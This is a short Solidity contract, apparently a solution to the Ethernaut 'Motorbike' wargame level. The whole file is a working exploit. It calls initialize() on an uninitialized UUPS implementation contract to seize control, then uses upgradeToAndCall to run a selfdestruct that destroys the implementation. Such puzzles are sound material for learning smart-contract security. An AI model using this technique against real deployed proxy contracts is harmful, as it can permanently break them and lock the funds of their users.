// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Engine {
    function upgradeToAndCall(address, bytes memory) external payable;

    function initialize() external;
}

contract MotorAttacker {
    function attack(address engine) external {
        // iitialize haven't been executed on engine contract
        // it only been executed on motorbike
        Engine(engine).initialize();

        bytes memory calldatas = abi.encodeWithSelector(MotorAttacker.boom.selector);
        Engine(engine).upgradeToAndCall(address(this), calldatas);
    }

    function boom() external {
        selfdestruct(payable(address(0)));
    }
}
